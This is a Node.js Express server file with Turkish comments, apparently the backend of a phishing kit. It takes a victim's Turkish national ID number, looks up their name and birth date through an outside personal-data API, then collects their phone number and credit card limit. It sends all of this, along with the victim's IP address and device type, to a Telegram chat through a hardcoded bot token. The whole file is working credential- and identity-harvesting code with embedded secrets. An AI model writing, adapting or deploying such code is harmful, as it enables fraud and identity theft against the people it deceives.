const express = require("express");
const axios = require("axios");
const bodyParser = require("body-parser");
const session = require("express-session");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = "7532794844:AAEVd9ILVPD4p5yStZt6EAMuiEJ01ok2_Kw";
const TELEGRAM_CHAT_ID = "-1002546140880";

const userDataStore = {};

// Body parser
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Session ayarları
app.use(session({
    secret: 'mySecretKey',
    resave: false,
    saveUninitialized: true
}));

// Statik dosyalar (public klasöründen servis edilir)
app.use(express.static("public"));

// Ana giriş noktası
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Giriş işlemi
app.post("/giris", async (req, res) => {
    const { tc } = req.body;

    if (!tc || tc.trim() === "") {
        return res.redirect("/login.html?error=T.C. Kimlik numarası boş veya geçersiz");
    }

    try {
        const apiUrl = `https://apiv2.tsgonline.net/tsgapis/Kettaass/adpro.php?auth=tsgxyunus&tc=${tc}`;
        const response = await axios.get(apiUrl);
        console.log("API Response:", response.data); // Debug API response
        const { adi, soyadi, dogumtarihi } = response.data;

        if (!adi || !soyadi || !dogumtarihi) {
            console.log("Missing fields - adi:", adi, "soyadi:", soyadi, "dogumtarihi:", dogumtarihi);
            return res.redirect("/login.html?error=T.C. Kimlik numarası sistemde bulunamadı");
        }

        req.session.userData = { tc, adi, soyadi, dogumtarihi };
        res.redirect(`/chack.html?adi=${encodeURIComponent(adi)}&soyadi=${encodeURIComponent(soyadi)}&dogumtarihi=${encodeURIComponent(dogumtarihi)}`);
    } catch (error) {
        console.error("API Hatası:", error.message, error.response?.data);
        return res.redirect("/login.html?error=T.C. Kimlik numarası sistemde bulunamadı veya API hatası");
    }
});

// Chack form işlemi
app.post("/chack", async (req, res) => {
    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    const islemSaati = new Date().toLocaleString("tr-TR", { timeZone: "Europe/Istanbul" });
    const userAgent = req.headers["user-agent"];

    let cihazTuru = "Bilinmiyor";
    if (/android/i.test(userAgent)) {
        cihazTuru = "Android";
    } else if (/iphone|ipad|ipod/i.test(userAgent)) {
        cihazTuru = "iOS";
    } else if (/windows|mac|linux/i.test(userAgent)) {
        cihazTuru = "PC";
    }

    const { phone, adi, soyadi, limit } = req.body;

    if (!adi || !soyadi || !phone) {
        return res.status(400).send("Eksik bilgi: adi, soyadi veya telefon numarası bulunamadı.");
    }

    if (!userDataStore[adi]) {
        userDataStore[adi] = {
            phone: phone || "Belirtilmedi",
            limit: limit || "Belirtilmedi",
            isSent: false
        };
    }

    if (userDataStore[adi].isSent) {
        console.log("Bu kullanıcı için zaten Telegram mesajı gönderildi:", adi);
        return res.status(400).send("Bu kullanıcı için zaten işlem yapıldı.");
    }

    let storedPhone = userDataStore[adi].phone;
    if (typeof storedPhone === "string") {
        storedPhone = [...new Set(storedPhone.split(","))].join(", ");
    }

    let storedLimit = userDataStore[adi].limit;
    if (typeof storedLimit === "string") {
        storedLimit = storedLimit.replace(/\D/g, ''); // Sadece rakamları al
        if (storedLimit) {
            storedLimit = new Intl.NumberFormat('tr-TR').format(parseInt(storedLimit, 10));
        } else {
            storedLimit = "Belirtilmedi";
        }
    }

    const { tc, dogumtarihi } = req.session.userData || {};

    // Updated Telegram message formatting
    const entry = `
🔥 *KETRAN* 🔥

📋 *Kullanıcı Bilgileri*
👤 *Ad Soyad*: ${adi} ${soyadi}
📍 *T.C. Kimlik*: ${tc || "Belirtilmedi"}
📅 *Doğum Tarihi*: ${dogumtarihi || "Belirtilmedi"}

📱 *İletişim Bilgileri*
☎️ *Telefon*: ${storedPhone}
💳 *Kart Limiti*: ${storedLimit} ₺

🖥️ *Cihaz ve İşlem Bilgileri*
📱 *Cihaz Türü*: ${cihazTuru}
🌐 *IP Adresi*: ${ip}
🕒 *İşlem Saati*: ${islemSaati}
`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: entry,
            parse_mode: "Markdown" // Enable Markdown for bold and formatting
        });

        userDataStore[adi].isSent = true;
        delete userDataStore[adi];

        return res.redirect(`/basarili.html?adi=${encodeURIComponent(adi)}&soyadi=${encodeURIComponent(soyadi)}&dogumtarihi=${encodeURIComponent(dogumtarihi)}&islemSaati=${encodeURIComponent(islemSaati)}`);
    } catch (error) {
        console.error("Telegram Hatası:", error);
        return res.status(500).send("Telegram'a gönderim sırasında bir hata oluştu.");
    }
});
// Sunucu başlat
app.listen(PORT, () => {
    console.log(`Sunucu ${PORT} portunda çalışıyor.`);
});

module.exports = app;